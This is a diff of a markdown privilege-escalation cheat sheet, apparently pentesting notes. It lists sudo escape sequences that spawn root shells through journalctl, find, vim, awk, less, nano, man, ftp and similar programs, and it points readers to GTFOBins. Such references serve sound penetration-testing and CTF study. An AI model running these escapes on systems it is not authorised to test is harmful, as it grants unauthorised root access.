@@ -291,7 +291,7 @@ whoami
 root
 ```
 
-### Sudo-Shell escape Sequences
+## Sudo-Shell escape Sequences
 
 * List the programs which sudo allows your user to run:
 
@@ -301,7 +301,7 @@ sudo -l
 
 Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
-#### Zip
+### Zip
 
 ```
 User merlin may run the following commands on ubuntu:
@@ -316,33 +316,33 @@ uid=0(root) gid=0(root) groups=0(root)
 Sudo -l
 ```
 
-#### npm
+### npm
 
 * ![alt text](https://miro.medium.com/max/2400/1\*VucdYx033uiuiMXc7ZxIhQ.png)
 * ![alt text](https://miro.medium.com/max/2400/1\*0yhB6pvhjXSAJq1BuFPyxA.png)
 
-#### journalctl
+### journalctl
 
 ```
 sudo journalctl
 !/bin/sh
 ```
 
-#### iftop
+### iftop
 
 ```
 sudo /usr/bin/iftop
 !/bin/bash #hit enter
 ```
 
-#### find
+### find
 
 ```
 sudo /usr/bin/find . -exec /bin/bash \; -quit
 sudo /find /bin -name nano -exec /bin/sh \;
 ```
 
-#### nano
+### nano
 
 ```
 sudo /usr/bin/nano
@@ -350,7 +350,7 @@ Press ctrl+r then ctrl +x
 Reset; bash 1>&0 2>&0
 ```
 
-#### vim
+### vim
 
 ```
 sudo vim -c ':!/bin/bash'
@@ -362,42 +362,49 @@ sudo vim -c ':!/bin/bash'
 sudo vim -c '!sh'
 ```
 
-#### vi
+* Method 3
 
 ```
 :set shell=/bin/sh
 :shell
 ```
 
-#### man
+### vi
+
+```
+:set shell=/bin/sh
+:shell
+```
+
+### man
 
 ```
 sudo /usr/bin/man man
 !/bin/sh
 ```
 
-#### awk
+### awk
 
 ```
 sudo awk 'BEGIN {system("/bin/bash")}'
 sudo awk 'BEGIN {system("/bin/sh")}'
 ```
 
-#### less
+### less
 
 ```
 sudo /usr/bin/less /etc/profile
 !/bin/sh
 ```
 
-#### FTP
+### FTP
 
 ```
 sudo /usr/bin/ftp
 !/bin/bash
 ```
 
-#### nmap
+### nmap
 
 * Method 1
 
@@ -427,7 +434,7 @@ TERM= sudo -E more /etc/profile
 !/bin/bash
 ```
 
-#### Apache2
+### Apache2
 
 ```
 sudo -l 
